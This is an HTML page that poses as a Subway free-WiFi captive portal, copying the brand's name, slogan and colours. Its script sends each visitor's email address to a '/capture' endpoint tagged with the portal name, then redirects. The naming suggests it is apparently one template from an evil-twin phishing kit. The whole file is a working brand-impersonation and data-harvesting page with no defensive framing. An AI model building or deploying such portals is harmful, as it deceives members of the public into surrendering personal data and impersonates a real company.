<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Subway WiFi</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#ffcc00 0%,#ff9900 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;box-shadow:0 10px 30px rgba(0,0,0,0.3);max-width:400px;width:100%;padding:40px 30px}.logo{text-align:center;margin-bottom:30px}.logo h1{color:#008c15;font-size:32px;font-weight:bold}.logo p{color:#ffcc00;font-size:14px;margin-top:5px}h2{color:#333;text-align:center;margin-bottom:25px;font-size:20px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px;font-size:14px}input:focus{outline:none;border-color:#008c15}button{width:100%;padding:14px;background:#008c15;color:white;border:none;border-radius:5px;font-size:16px;font-weight:bold;cursor:pointer}button:hover{background:#007010}.footer{text-align:center;margin-top:20px;color:#888;font-size:12px}</style></head><body><div class="container"><div class="logo"><h1>SUBWAY</h1><p>EAT FRESH</p></div><h2>Free WiFi</h2><form id="loginForm"><div class="form-group"><label>Email Address</label><input type="email" id="email" required placeholder="your@email.com"></div><button type="submit">Connect to WiFi</button></form><div class="footer">Enjoy free Subway WiFi</div></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const email=document.getElementById('email').value;console.log('[Subway] Email:',email);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'Subway',email:email})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
